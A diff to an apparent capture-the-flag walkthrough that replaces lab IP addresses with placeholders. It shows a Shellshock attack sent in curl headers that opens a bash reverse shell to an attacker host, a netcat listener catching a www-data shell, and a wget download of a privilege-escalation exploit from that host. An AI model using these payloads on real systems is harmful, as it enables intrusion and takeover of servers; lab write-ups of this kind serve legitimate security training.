@@ -128,23 +128,23 @@ Finished
 
 <br>
 
-<h2 align="center">$$\textcolor{white}{\textnormal{Metasploit}}$$</h2>
+<h2 align="center">$$\textcolor{white}{\textnormal{curl}}$$</h2>
 
 
 ```bash
-:~# curl http://10.10.66.29/cgi-bin/test.cgi \
+:~# curl http://TargetIP/cgi-bin/test.cgi \
 > -H "User-Agent: $PWN" \
 > -H "Cookie: $PWN" \
 > -H "Referer: $PWN" -v
-*   Trying 10.10.66.29:80...
+*   Trying TargetIP:80...
 * TCP_NODELAY set
-* Connected to 10.10.66.29 (10.10.66.29) port 80 (#0)
+* Connected to TargetIP (TargetIP) port 80 (#0)
 > GET /cgi-bin/test.cgi HTTP/1.1
-> Host: 10.10.66.29
+> Host: TargetIP
 > Accept: */*
-> User-Agent: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.135.92/4444 0>&1 &'
-> Cookie: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.135.92/4444 0>&1 &'
-> Referer: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.135.92/4444 0>&1 &'
+> User-Agent: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/AttckIP/4444 0>&1 &'
+> Cookie: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/AttackIP/4444 0>&1 &'
+> Referer: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/AttackIP/4444 0>&1 &'
 > 
 * Mark bundle as not supporting multiuse
 < HTTP/1.1 500 Internal Server Error
@@ -177,9 +177,7 @@ in the server error log.</p>
 ```bash
 :~# nc -lnvp 4444
 Listening on 0.0.0.0 4444
-Connection received on 10.10.66.29 44063
-bash: cannot set terminal process group (838): Inappropriate ioctl for device
-bash: no job control in this shell
+...
 www-data@ubuntu:/usr/lib/cgi-bin$ ls
 ls
 test.cgi
@@ -212,7 +210,7 @@ cd /tmp
 ```
 
 
-<p>Downloaded https://www.exploit-db.com/exploits/37292.  ---> 37292.c</p>
+<p>Downloaded https://www.exploit-db.com/exploits/37292.c  ---> 37292.c</p>
 
 <br>
 
@@ -225,14 +223,8 @@ cd /tmp
 ```
 
 ```bash
-www-data@ubuntu:/tmp$ wget http://10.10.135.92:6666/37292.c
-wget http://10.10.135.92:6666/37292.c
---2025-05-09 16:30:29--  http://10.10.135.92:6666/37292.c
-Connecting to 10.10.135.92:6666... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 5119 (5.0K) [text/plain]
-Saving to: '37292.c'
-
+www-data@ubuntu:/tmp$ wget http://AttackIP:6666/37292.c
+...
      0K ....                                                  100%  398M=0s
 
 2025-05-09 16:30:29 (398 MB/s) - '37292.c' saved [5119/5119]
